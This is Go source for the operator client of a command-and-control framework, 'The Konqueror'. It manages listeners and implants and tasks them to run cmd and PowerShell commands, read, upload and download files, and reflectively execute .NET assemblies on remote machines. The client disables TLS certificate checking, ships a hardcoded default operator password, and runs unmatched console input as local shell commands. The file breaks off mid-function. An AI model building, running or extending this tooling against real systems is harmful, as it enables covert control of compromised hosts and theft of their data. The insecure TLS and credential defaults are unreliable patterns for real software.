package main

import (
	"../helpers"
	"../messages"
	"../protobuf"
	"bufio"
	"bytes"
	ct "context"
	"crypto/md5"
	sha2562 "crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/olekukonko/tablewriter"
	uuid "github.com/satori/go.uuid"
	"golang.org/x/net/http2"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Default starting context
var context = "main"
var prompt *readline.Instance

// Locks needed
var mutex1 = &sync.Mutex{} // implants

// Function to parse command line options
func getOptions() (string, string, string, string, string, string, string, string) {
	ip := flag.String("i", "localhost", "The API Server IP address")
	port := flag.String("p", "9002", "The API Server port")
	gPort := flag.String("g", "9003", "The server port where the gRPC service is listening on")
	username := flag.String("u", "operator", "The operator username")
	password := flag.String("P", "nevergonnaletyoudown", "The operator password")
	certPath := flag.String("c", "../certs/client/client.crt", "The path to the TLS cert")
	keyPath := flag.String("k", "../certs/client/client.key", "The path to the TLS private key")
	caPath := flag.String("a", "../certs/ca/ca.crt", "The path to the CA certificate")

	flag.Parse()

	return *ip, *port, *username, *password, *certPath, *keyPath, *caPath, *gPort
}

// Struct to define the client application
type konquerorClient struct {
	apiAddress             string
	username               string
	password               string
	httpClient             *http.Client
	apiKey                 string
	currentWorkingImplant  uuid.UUID
	globalActiveImplants   []*messages.Implant
	gRPCConnection         *grpc.ClientConn
}

// Main function which handles all client logic
func main() {

	// Print banner
	helpers.ClientBanner()

	// Retrieve command line options
	serverIP, serverPort, username, password, certificatePath, certificateKeyPath, caPath, gPort := getOptions()

	// Check if any of the argument is missing
	if certificatePath == "" {
		helpers.ExitOnError("Please insert the path to the TLS certificate")

	}

	if certificateKeyPath == "" {
		helpers.ExitOnError("Please insert the path to the TLS certificate private key")
	}

	if serverIP == "" {
		helpers.ExitOnError("Please insert the IP address of the API server")
	}

	if serverPort == "" {
		helpers.ExitOnError("Please insert the port of the API server")
	}

	if username == "" {
		helpers.ExitOnError("Please insert the username of the operator")
	}

	if password == "" {
		helpers.ExitOnError("Please insert the password of the operator")
	}

	if caPath == "" {
		helpers.ExitOnError("Please insert the path to the CA certificate")
	}

	if gPort == "" {
		helpers.ExitOnError("Please insert the port where the gRPC service is listening on")
	}

	// Set up the client object and the TLS stuff
	cert, err := tls.LoadX509KeyPair(certificatePath, certificateKeyPath)
	if err != nil {
		helpers.ExitOnError("There was an error while loading the TLS certificate")
	}

	caCert, err := ioutil.ReadFile(caPath)
	if err != nil {
		helpers.ExitOnError(err.Error())
	}

	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	// Create a TLS configuration object
	tlsConfiguration := &tls.Config{
		InsecureSkipVerify:  true,  // Leaving this here for testing purposes as the server certificate might not have the correct IP
		NextProtos:         []string{"h2"},
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
	}

	// Create an http2 transport
	clientTransport := &http2.Transport{
		TLSClientConfig: tlsConfiguration,
	}

	// Create the http client object which will be used for all http requests
	httpClient := &http.Client{
		Transport: clientTransport,
	}

	// Create The Conqueror client object
	konqClient := konquerorClient{
		apiAddress: "https://" + serverIP + ":" + serverPort,
		username:   username,
		password:   password,
		httpClient: httpClient,
	}

	// gRPC TLS config
	creds := credentials.NewTLS(&tls.Config{
		InsecureSkipVerify: true, // Leaving this here for testing purposes as the server certificate might not have the correct IP
		Certificates:  		[]tls.Certificate{cert},
		RootCAs:       		caCertPool,
	})

	// Connect to gRPC server
	conn, err := grpc.Dial(serverIP + ":" + gPort, grpc.WithTransportCredentials(creds))
	if err != nil {
		helpers.ExitOnError(err.Error())
	}
	defer conn.Close()

	// Save the connection object
	konqClient.gRPCConnection = conn
	// Create all services
	getImplantCheckIn := protomessages.NewGetImplantCheckInClient(conn)
	getTaskResults := protomessages.NewGetTaskResultClient(conn)

	// Login and retrieve the API Key
	konqClient.login()

	// Method to log out from the API server when the app closes
	defer konqClient.logout()

	// Set the shell autocomplete
	shell, err := readline.NewEx(&readline.Config{
		Prompt:              "\033[31m(TheKonqueror)»\033[0m ",
		HistoryFile:         "/tmp/readline.tmp",
		AutoComplete:        konqClient.sortCompleter("main"),
		InterruptPrompt:     "^C",
		EOFPrompt:           "exit",
		HistorySearchFold:   true,
		FuncFilterInputRune: helpers.FilterInput,
	})

	if err != nil {
		helpers.ExitOnError(err.Error())
	}

	// Copy the shell
	prompt = shell

	defer prompt.Close()

	// Goroutine to get task results
	go func() {
		stream, err := getTaskResults.GetTaskResult(ct.Background(), &protomessages.Username{
			Username:konqClient.username},
		)
		if err != nil {
			// We might need to exit here
			helpers.NicePrinting("fail", err.Error())
			return
		}

		// goroutine to receive responses
		go func() {
			for {
				// Read from the stream
				taskResult, err := stream.Recv()
				if err == io.EOF {
					panic("EOF")
				}
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					panic(err)
				}
				fmt.Println()
				helpers.NicePrinting("info", "Results for task " + uuid.Must(uuid.FromString(taskResult.Uuid.Value)).String())
				fmt.Println()

				// Switch based on the task type
				switch taskResult.Type {
				case "cat":
					if taskResult.Success == false {
						color.Red(taskResult.Result)
					} else {
						decoded, err := base64.StdEncoding.DecodeString(taskResult.Result)
						if err != nil {
							helpers.NicePrinting("fail", "Failed to decode the file")
							break
						}
						color.White(string(decoded))
					}
				case "download":
					if taskResult.Success == false {
						color.Red(taskResult.Result)
					} else {
						// Decode the file blob and save it to disk
						decoded, err := base64.StdEncoding.DecodeString(taskResult.Result)
						if err != nil {
							helpers.NicePrinting("fail", err.Error())
							break
						}
						// Open a file and save to it
						file, err := os.Create(taskResult.Arguments[1])
						if err != nil {
							helpers.NicePrinting("fail", err.Error())
							break
						}

						if _, err := file.Write(decoded); err != nil {
							helpers.NicePrinting("fail", err.Error())
							break
						}
						if err := file.Sync(); err != nil {
							helpers.NicePrinting("fail", err.Error())
							break
						}
						_ = file.Close()
						helpers.NicePrinting("plus",
							"Successfully saved "+taskResult.Arguments[0]+" to "+taskResult.Arguments[1])
					}
				default:
					if taskResult.Success {
						color.Cyan(taskResult.Result)
					} else {
						color.Red(taskResult.Result)
					}
				}
			}
		}()
	}()

	// Goroutine to check when implants check in
	go func() {
		// Get the stream
		stream, err := getImplantCheckIn.GetImplantCheckIn(ct.Background(), &protomessages.Username{
			Username: konqClient.username,
		})
		if err != nil {
			// We might need to exit here
			helpers.NicePrinting("fail", err.Error())
			return
		}

		// goroutine to receive responses
		go func() {
			for {
				// Read from stream
				tmpImplant, err := stream.Recv()
				if err == io.EOF {
					fmt.Printf("EOF")
					return
				}
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					return
				}
				mutex1.Lock()
				// Check if the implant was already recorded as checked in
				if !helpers.ImplantInImplantsSlice(uuid.Must(uuid.FromString(tmpImplant.Uuid.Value)), konqClient.globalActiveImplants) {
					// Convert implant from protoimplant to normal implant
					implant := messages.Implant{
						UUID:          uuid.Must(uuid.FromString(tmpImplant.Uuid.Value)),
						CWD:           tmpImplant.Cwd,
						OS:            tmpImplant.Os,
						Arch:          tmpImplant.Arch,
						Jitter:        int(tmpImplant.Jitter),
						UserID:        tmpImplant.UserID,
						Hostname:      tmpImplant.Hostname,
						FailedCheckIn: int(tmpImplant.FailedCheckIns),
						MaxRetry:      int(tmpImplant.MaxRetry),
						PID:           int(tmpImplant.PID),
						PPID:          int(tmpImplant.PPID),
						Username:      tmpImplant.Username,
						SleepTime:     time.Duration(tmpImplant.SleepTime),
						ListenerUUID:  uuid.Must(uuid.FromString(tmpImplant.ListenerUUID.Value)),
						Status:        tmpImplant.Status,
						KillDate:      tmpImplant.KillDate,
						Type:          tmpImplant.Type,
					}
					// Add the implant to the implant slice
					konqClient.globalActiveImplants = append(konqClient.globalActiveImplants, &implant)
					fmt.Println()
					helpers.NicePrinting("info", "Implant "+implant.UUID.String()+" checked in")
				}
				mutex1.Unlock()
			}
		} ()
	}()

	//Infinite loop to read from stdin
	for {
		// Read input and check for errors
		line, err := shell.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		// Remove multi space from input
		space := regexp.MustCompile(`\s+`)
		line = space.ReplaceAllString(line, " ")
		line = strings.TrimSpace(line)

		// Split the input on space
		cmdSlice := strings.Split(line, " ")

		// Switch actions based on the current context (menu)
		switch context {
		case "main":
			// Switch based on the option chosen
			switch cmdSlice[0] {
			case "help":
				helpers.MainHelpMenu()
			case "?":
				helpers.MainHelpMenu()
			case "interact":
				// Check argument length
				if len(cmdSlice) != 2 {
					helpers.NicePrinting("fail", "Please select a valid options")
					break
				}
				// Parse the input
				implantUUID, err := uuid.FromString(cmdSlice[1])
				if err != nil {
					helpers.NicePrinting("fail", "Please insert a valid UUID")
					break
				}
				// Check if the implant is stored as active locally
				if !konqClient.getActiveImplant(implantUUID) {
					helpers.NicePrinting("fail", "The selected implant is not active")
					break
				}
				// Go to implant menu
				konqClient.implantMenu(cmdSlice[1])
			case "listeners":
				konqClient.listenersMenu()
			case "apikey":
				helpers.NicePrinting("info", "The current operator's API Key is "+konqClient.apiKey)
			case "list":
				if len(cmdSlice) != 2 {
					helpers.NicePrinting("fail", "Please select a valid option")
					break
				}
				switch cmdSlice[1] {
				case "listeners":
					response, err := konqClient.doGet("/api/listeners")
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}

					// Decode the response body
					var responseMessage messages.Message
					err = json.NewDecoder(response.Body).Decode(&responseMessage)

					// Everything apart from a 200 will be an error on the server side
					if response.StatusCode != 200 {
						helpers.NicePrinting("fail", responseMessage.Message.(string))
						break
					}

					// Marshal the response into a JSON Object
					activeListenersJSON, err := json.Marshal(responseMessage.Message)
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}

					// Make a slice of messages.Listeners
					var activeListeners []messages.Listener
					err = json.Unmarshal(activeListenersJSON, &activeListeners)
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}

					if len(activeListeners) == 0 {
						helpers.NicePrinting("info", "There are currently no active listeners")
						break
					}

					table := tablewriter.NewWriter(os.Stdout)
					table.SetHeader([]string{"Type", "UUID", "Status"})

					// Loop trough all listeners
					for _, listener := range activeListeners {
						data := [][]string{
							{listener.Type, listener.UUID.String(), "Active"},
						}

						for _, v := range data {
							table.Append(v)
						}
					}
					// Print table to STDOUT
					table.Render()
				case "implants":
					response, err := konqClient.doGet("/api/implants/status")
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}

					// Decode the response body
					var responseMessage messages.Message
					err = json.NewDecoder(response.Body).Decode(&responseMessage)

					// Everything apart from a 200 will be an error on the server side
					if response.StatusCode != 200 {
						helpers.NicePrinting("fail", responseMessage.Message.(string))
						break
					}

					// Marshal the response into a JSON Object
					activeImplantsJSON, err := json.Marshal(responseMessage.Message)
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}

					var activeImplants []messages.Implant
					err = json.Unmarshal(activeImplantsJSON, &activeImplants)
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}

					if len(activeImplants) == 0 {
						helpers.NicePrinting("info", "There are currently no active implants")
						break
					}

					table := tablewriter.NewWriter(os.Stdout)
					table.SetHeader([]string{"Type", "UUID", "Status"})

					// Reset the slice first
					mutex1.Lock()
					konqClient.globalActiveImplants = []*messages.Implant{}
					mutex1.Unlock()

					// Loop trough all implants and add them to the local slice
					for _, implant := range activeImplants {
						// Add the implants to the local slice of all active implant
						mutex1.Lock()
						konqClient.globalActiveImplants = append(konqClient.globalActiveImplants, &implant)
						mutex1.Unlock()
						data := [][]string{
							{implant.Type, implant.UUID.String(), "Active"},
						}
						for _, v := range data {
							table.Append(v)
						}
					}
					// Print table to STDOUT
					table.Render()
				default:
					helpers.NicePrinting("fail", "Please select either listeners or implants")
					break
				}
			case "kill":
				if len(cmdSlice) != 3 {
					helpers.NicePrinting("fail", "Please use the right syntax, for help type help or ?")
					break
				}
				switch cmdSlice[1] {
				// Kill a listener
				case "listener":
					// Create DELETE request
					request, err := http.NewRequest("DELETE", konqClient.apiAddress+"/api/listeners", nil)
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}
					// Set headers
					request.Header.Set("User-Agent", "The Conqueror client v0.1.0")
					request.Header.Set("Cookie", "APIKEY="+konqClient.apiKey)

					// Set query parameters
					query := request.URL.Query()
					query.Add("listener_id", cmdSlice[2])
					request.URL.RawQuery = query.Encode()

					// Send request
					response, err := konqClient.httpClient.Do(request)
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}

					var result messages.Message
					err = json.NewDecoder(response.Body).Decode(&result)

					// Check response code and print accordingly
					if response.StatusCode != 200 {
						helpers.NicePrinting("fail", result.Message.(string))
						break
					}

					helpers.NicePrinting("plus", result.Message.(string))
				// Kill an implant
				case "implant":
					implantUUID, err := uuid.FromString(cmdSlice[2])
					if err != nil {
						helpers.NicePrinting("fail", "Please insert a valid UUID")
						break
					}
					// Create DELETE request
					request, err := http.NewRequest("DELETE", konqClient.apiAddress+"/api/implants", nil)
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}
					// Set headers
					request.Header.Set("User-Agent", "The Conqueror client v0.1.0")
					request.Header.Set("Cookie", "APIKEY="+konqClient.apiKey)

					// Set query parameters
					query := request.URL.Query()
					query.Add("implant_id", cmdSlice[2])
					request.URL.RawQuery = query.Encode()

					// Send request
					response, err := konqClient.httpClient.Do(request)
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}

					var result messages.Message
					err = json.NewDecoder(response.Body).Decode(&result)

					// Check response code and print accordingly
					if response.StatusCode != 200 {
						helpers.NicePrinting("fail", result.Message.(string))
						break
					}

					helpers.NicePrinting("plus", result.Message.(string))
					//  Remove from saved implants
					mutex1.Lock()
					if len(konqClient.globalActiveImplants) == 1 {
						konqClient.globalActiveImplants = []*messages.Implant{}
						mutex1.Unlock()
						break
					}
					mutex1.Unlock()
					implantIndex := helpers.GetImplantIndexFromSlice(implantUUID, konqClient.globalActiveImplants)
					mutex1.Lock()
					konqClient.globalActiveImplants = append(
						konqClient.globalActiveImplants[:implantIndex],
						konqClient.globalActiveImplants[implantIndex+1],
					)
					mutex1.Unlock()
				}
			case "quit":
				helpers.NicePrinting("info", "Exiting...")
				konqClient.logout()
				os.Exit(0)
			case "exit":
				helpers.NicePrinting("info", "Exiting...")
				konqClient.logout()
				os.Exit(0)
			case "set":
				if len(cmdSlice) != 3 {
					helpers.NicePrinting("fail", "Please select a valid option")
					break
				}
				if cmdSlice[1] != "listener" {
					helpers.NicePrinting("fail", "Please select a valid option")
					break
				}
				listenerUUID, err := uuid.FromString(cmdSlice[2])
				if err != nil {
					helpers.NicePrinting("fail", "That is not a valid UUID")
					break
				}
				response, err := konqClient.doGet("/api/listeners/" + listenerUUID.String())
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}

				var message messages.Message
				err = json.NewDecoder(response.Body).Decode(&message)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}

				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", message.Message.(string))
					break
				}

				var listener messages.Listener
				JSONListener, err := json.Marshal(message.Message)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}

				err = json.Unmarshal(JSONListener, &listener)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}

				helpers.NicePrinting("plus", "Set "+listenerUUID.String()+" as active listener")
			// If not in any of the cases then execute a system command
			default:
				var prependCmd, arg1 string
				// Check on what OS we are running
				if runtime.GOOS == "windows" {
					prependCmd = "cmd.exe"
					arg1 = "/c"
				} else {
					prependCmd = "bash"
					arg1 = "-c"
				}
				// Exec shell command
				result := exec.Command(prependCmd, arg1, line)
				var stdout, stderr bytes.Buffer
				result.Stdout = &stdout
				result.Stderr = &stderr
				err := result.Run()
				if err != nil {
					helpers.NicePrinting("fail", "The shell command failed to execute ")
					break
				}
				// Print output
				helpers.NicePrinting("plus", "Exec "+line+"\n\n"+stdout.String())
			}
		// Listeners menu can be used to create listeners
		case "listeners":
			switch cmdSlice[0] {
			case "help":
				helpers.ListenersHelpMenu()
			case "?":
				helpers.ListenersHelpMenu()
			case "main":
				konqClient.mainMenu()
			case "back":
				konqClient.mainMenu()
			case "generate":
				// This is where additional listeners logic can be inserted
				switch cmdSlice[1] {
				case "http2":
					// Send message to the Server to save details for a new listener
					if len(cmdSlice) != 4 {
						helpers.NicePrinting("fail", "Please use the right syntax, for help type ? or help")
						break
					}
					// Create an hex representation for the encryption key
					hash := md5.New()
					hash.Write([]byte(cmdSlice[2]))
					aesKey := hex.EncodeToString(hash.Sum(nil))
					hash.Reset()
					hash.Write([]byte(cmdSlice[3]))
					hashedHMAC := hex.EncodeToString(hash.Sum(nil))

					// Generate UUID
					listenerUUID := uuid.Must(uuid.NewV4())

					// Create the listener message
					newListener := messages.Listener{
						Type:    cmdSlice[1],
						AESKey:  aesKey,
						UUID:    listenerUUID,
						HMACKey: hashedHMAC,
					}

					// Send the message to the server
					response, err := konqClient.doPost("/api/listeners", newListener)
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}
					// Decode the response body
					var responseMessage messages.Message
					err = json.NewDecoder(response.Body).Decode(&responseMessage)
					if err != nil {
						helpers.NicePrinting("fail", err.Error())
						break
					}

					// Check the response code
					if response.StatusCode != 200 {
						helpers.NicePrinting("fail", responseMessage.Message.(string))
						break
					}

					helpers.NicePrinting("plus", "Successfully created a new listener with UUID "+newListener.UUID.String())
					helpers.NicePrinting("info", "Please add the UUID to the configuration file")
				default:
					helpers.NicePrinting("fail", "This listener type has not been implemented yet")
				}
			default:
				helpers.NicePrinting("fail", "Please select a valid option")
			}
		case "implants":
			switch cmdSlice[0] {
			case "main":
				konqClient.mainMenu()
			case "back":
				konqClient.mainMenu()
			case "?":
				helpers.ImplantsHelpMenu()
			case "help":
				helpers.ImplantsHelpMenu()
			case "quit":
				helpers.NicePrinting("info", "Exiting...")
				konqClient.logout()
				os.Exit(0)
			case "exit":
				helpers.NicePrinting("info", "Exiting...")
				konqClient.logout()
				os.Exit(0)
			case "cmd":
				if len(cmdSlice) == 1 {
					helpers.NicePrinting(
						"failed", "Please insert a command to execute on the implant")
					break
				}
				// Create a task
				listenerUUID, ok := konqClient.getListenerUUID(konqClient.currentWorkingImplant)
				if !ok {
					helpers.NicePrinting("fail", "There was an error..")
					break
				}
				task := messages.Task{
					Type:         "cmd",
					UUID:         uuid.Must(uuid.NewV4()),
					Args:         cmdSlice[1:],
					ImplantUUID:  konqClient.currentWorkingImplant,
					ListenerUUID: listenerUUID,
				}
				// Send task
				response, err := konqClient.doPost("/api/implants/tasks", task)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "Failed to create a new task")
					break
				}
				helpers.NicePrinting("info", "Successfully created new task "+task.UUID.String())
			case "powershell":
				if len(cmdSlice) == 1 {
					helpers.NicePrinting(
						"failed", "Please insert a command to execute on the implant")
					break
				}
				// Create a task
				listenerUUID, ok := konqClient.getListenerUUID(konqClient.currentWorkingImplant)
				if !ok {
					helpers.NicePrinting("fail", "There was an error..")
					break
				}
				task := messages.Task{
					Type:         "powershell",
					UUID:         uuid.Must(uuid.NewV4()),
					Args:         cmdSlice[1:],
					ImplantUUID:  konqClient.currentWorkingImplant,
					ListenerUUID: listenerUUID,
				}

				response, err := konqClient.doPost("/api/implants/tasks", task)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "Failed to create a new task")
					break
				}
				helpers.NicePrinting("info", "Successfully created new task "+task.UUID.String())
			case "ls":
				if len(cmdSlice) > 2 {
					helpers.NicePrinting(
						"fail",
						"Please insert the directory path or leave it empty for listing the current directory",
					)
					break
				}
				// Check if there is a directory path or otherwise put a "." for current dir
				var args string
				if len(cmdSlice) == 1 {
					args = "."
				} else {
					args = cmdSlice[1]
				}
				// Get listener UUID
				listenerUUID, ok := konqClient.getListenerUUID(konqClient.currentWorkingImplant)
				if !ok {
					helpers.NicePrinting("fail", "There was an error..")
					break
				}
				// Create a task
				task := messages.Task{
					Type:         "ls",
					UUID:         uuid.Must(uuid.NewV4()),
					Args:         []string{args},
					ImplantUUID:  konqClient.currentWorkingImplant,
					ListenerUUID: listenerUUID,
				}
				response, err := konqClient.doPost("/api/implants/tasks", task)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "Failed to create a new task")
					break
				}
				helpers.NicePrinting("info", "Successfully created task "+task.UUID.String())
			case "ifconfig":
				if len(cmdSlice) != 1 {
					helpers.NicePrinting("fail", "Please use the right syntax")
					break
				}
				// Get listener UUID
				listenerUUID, ok := konqClient.getListenerUUID(konqClient.currentWorkingImplant)
				if !ok {
					helpers.NicePrinting("fail", "There was an error..")
					break
				}
				task := messages.Task{
					Type:         "ifconfig",
					UUID:         uuid.Must(uuid.NewV4()),
					ListenerUUID: listenerUUID,
					ImplantUUID:  konqClient.currentWorkingImplant,
				}

				response, err := konqClient.doPost("/api/implants/tasks", task)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "Failed to create a new task")
					break
				}
				helpers.NicePrinting("info", "Successfully created task "+task.UUID.String())
			case "ps":
				if len(cmdSlice) != 1 {
					helpers.NicePrinting("fail", "Please use the right syntax")
					break
				}
				// Get listener UUID
				listenerUUID, ok := konqClient.getListenerUUID(konqClient.currentWorkingImplant)
				if !ok {
					helpers.NicePrinting("fail", "There was an error..")
					break
				}
				// Create a task
				task := messages.Task{
					Type:         "ps",
					UUID:         uuid.Must(uuid.NewV4()),
					ImplantUUID:  konqClient.currentWorkingImplant,
					ListenerUUID: listenerUUID,
				}
				response, err := konqClient.doPost("/api/implants/tasks", task)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "Failed to create a new task")
					break
				}
				helpers.NicePrinting("info", "Successfully created task  "+task.UUID.String())
			case "cat":
				if len(cmdSlice) != 2 {
					helpers.NicePrinting("fail", "Please insert the path to the file to read")
					break
				}
				// Get listener UUID
				listenerUUID, ok := konqClient.getListenerUUID(konqClient.currentWorkingImplant)
				if !ok {
					helpers.NicePrinting("fail", "There was an error..")
					break
				}
				task := messages.Task{
					Type:         "cat",
					UUID:         uuid.Must(uuid.NewV4()),
					Args:         []string{cmdSlice[1]},
					ListenerUUID: listenerUUID,
					ImplantUUID:  konqClient.currentWorkingImplant,
				}
				response, err := konqClient.doPost("/api/implants/tasks", task)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "Failed to create a new task")
					break
				}
				helpers.NicePrinting("info", "Successfully created task "+task.UUID.String())
			case "sysinfo":
				if len(cmdSlice) != 1 {
					helpers.NicePrinting("fail", "Please use the right syntax")
					break
				}
				tmpImplant := konqClient.getImplant(konqClient.currentWorkingImplant)
				response, err := konqClient.doGet("/api/implants/status/" + tmpImplant.ListenerUUID.String())
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "There was an error with getting the system info of the target machine")
					break
				}
				var implant messages.Implant
				err = json.NewDecoder(response.Body).Decode(&implant)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				konqClient.printImplant(implant, "sysinfo")
			case "info":
				if len(cmdSlice) != 1 {
					helpers.NicePrinting("fail", "Please use the right syntax")
					break
				}
				tmpImplant := konqClient.getImplant(konqClient.currentWorkingImplant)
				response, err := konqClient.doGet("/api/implants/status/" + tmpImplant.ListenerUUID.String())
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "There was an error with getting the system info of the target machine")
					break
				}
				var implant messages.Implant
				err = json.NewDecoder(response.Body).Decode(&implant)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				konqClient.printImplant(implant, "info")
			case "upload":
				// Upload a file to the target machine
				if len(cmdSlice) != 3 {
					helpers.NicePrinting("fail", "Syntax = upload local_path remote_path")
					break
				}
				// Get listener UUID
				listenerUUID, ok := konqClient.getListenerUUID(konqClient.currentWorkingImplant)
				if !ok {
					helpers.NicePrinting("fail", "There was an error..")
					break
				}
				if !helpers.CheckFile(cmdSlice[1]) {
					helpers.NicePrinting("fail", "The file does not exists")
					break
				}
				// Read file content
				file, err := os.Open(cmdSlice[1])
				if err != nil {
					helpers.NicePrinting("fail", "Failed to open the file")
					break
				}
				reader := bufio.NewReader(file)
				content, err := ioutil.ReadAll(reader)
				if err != nil {
					helpers.NicePrinting("fail", "Failed to read the file content")
					break
				}
				// create task
				task := messages.Task{
					Type:         "upload",
					UUID:         uuid.Must(uuid.NewV4()),
					Args:         []string{base64.StdEncoding.EncodeToString(content), cmdSlice[2]}, // 1 is file content 2 is destination path
					ListenerUUID: listenerUUID,
					ImplantUUID:  konqClient.currentWorkingImplant,
				}
				// Send the task
				response, err := konqClient.doPost("/api/implants/tasks", task)
				if err != nil {
					helpers.NicePrinting("fail", "Failed to send the task")
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "Failed to create a new task")
					break
				}
				helpers.NicePrinting("info", "Successfully created task "+task.UUID.String())
			case "download":
				if len(cmdSlice) != 3 {
					helpers.NicePrinting("fail", "Syntax = download remote_path local_path")
					break
				}
				// Get listener UUID
				listenerUUID, ok := konqClient.getListenerUUID(konqClient.currentWorkingImplant)
				if !ok {
					helpers.NicePrinting("fail", "There was an error..")
					break
				}
				// Create a task
				task := messages.Task{
					Type:         "download",
					UUID:         uuid.Must(uuid.NewV4()),
					ImplantUUID:  konqClient.currentWorkingImplant,
					ListenerUUID: listenerUUID,
					Args:         []string{cmdSlice[1], cmdSlice[2]}, // arg1 is remote path - arg2 is local path
				}
				response, err := konqClient.doPost("/api/implants/tasks", task)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "Failed to create a new task")
					break
				}
				helpers.NicePrinting("info", "Successfully created task "+task.UUID.String())
			case "set":
				if len(cmdSlice) != 3 {
					helpers.NicePrinting("fail", "Syntax = set option value")
					break
				}
				// Get listener UUID
				listenerUUID, ok := konqClient.getListenerUUID(konqClient.currentWorkingImplant)
				if !ok {
					helpers.NicePrinting("fail", "There was an error..")
					break
				}
				// Create a task
				task := messages.Task{
					Type:         "set",
					UUID:         uuid.Must(uuid.NewV4()),
					ImplantUUID:  konqClient.currentWorkingImplant,
					ListenerUUID: listenerUUID,
					Args:         []string{cmdSlice[1], cmdSlice[2]}, // arg1 is option - arg2 is value
				}
				response, err := konqClient.doPost("/api/implants/tasks", task)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "Failed to create a new task")
					break
				}
				helpers.NicePrinting("info", "Successfully created task "+task.UUID.String())
			case "execute-assembly":
				// Check length of input - minimum is execute-assembly clrpath assemblypath proces
				if len(cmdSlice) < 4 {
					helpers.NicePrinting("fail", "Please use the right syntax")
					break
				}
				// Read the CLR file
				clrBytes, err := ioutil.ReadFile(cmdSlice[1])
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				// Read the assembly file
				assemblyBytes, err := ioutil.ReadFile(cmdSlice[2])
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}

				// Get ReflectiveLoader function offset
				offset, err := helpers.GetExportOffset(cmdSlice[1], "ReflectiveLoader")
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}

				// Get listener UUID
				listenerUUID, ok := konqClient.getListenerUUID(konqClient.currentWorkingImplant)
				if !ok {
					helpers.NicePrinting("fail", "There was an error..")
					break
				}

				// Make a string with all arguments to the assembly
				var assemblyArgs string
				if len(cmdSlice[4:]) > 0 {
					assemblyArgs = strings.Join(cmdSlice[4:], " ")
				} else {
					assemblyArgs = ""
				}

				// Create the task
				task := messages.Task{
					Type:         "execute-assembly",
					UUID:         uuid.Must(uuid.NewV4()),
					Args:         []string{
						base64.StdEncoding.EncodeToString(clrBytes),
						base64.StdEncoding.EncodeToString(assemblyBytes),
						cmdSlice[3], // Program name
						assemblyArgs, // Arguments for the assembly
						strconv.FormatUint(uint64(offset), 10), // ReflectiveLoader offset
					},
					ListenerUUID: listenerUUID,
					ImplantUUID:  konqClient.currentWorkingImplant,
				}

				// Send the task
				response, err := konqClient.doPost("/api/implants/tasks", task)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode != 200 {
					helpers.NicePrinting("fail", "Failed to create a new task")
					break
				}
				helpers.NicePrinting("info", "Successfully created task "+task.UUID.String())
			case "get":
				if len(cmdSlice) != 3 || cmdSlice[1] != "task" {
					helpers.NicePrinting("fail", "Please use the right syntax")
					break
				}
				// Parse the UUID to check if is valid
				_, err := uuid.FromString(cmdSlice[2])
				if err != nil {
					helpers.NicePrinting("fail", "Please insert a valid task UUID")
					break
				}
				// Send request to get the task
				response, err := konqClient.doGet("/api/implants/tasks/" + cmdSlice[2])
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				if response.StatusCode == 204 {
